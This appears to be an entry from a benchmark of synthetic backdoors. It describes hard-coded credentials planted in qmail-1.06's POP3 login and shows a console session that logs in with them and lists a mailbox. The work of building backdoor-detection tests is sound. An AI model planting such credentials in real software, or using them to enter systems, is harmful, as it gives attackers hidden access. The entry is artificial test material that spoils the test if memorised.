# qmail-1.06 hard-coded credentials

- **Type**: hard-coded credentials
- **Affected versions**: none (synthetic backdoor)

### Backdoor

Hard-codded credentials are present in the source code (Username : `homer`, Password : `marge`).

### Triggering the backdoor

```console
$ ./qmail-popup localhost ./checkpassword ./qmail-pop3d ./mailbox/
+OK <1206737.1794578292@localhost>
USER homer
+OK 
PASS marge
+OK 
LIST
+OK 
1 1649
2 445
3 5144
4 2193
.
```
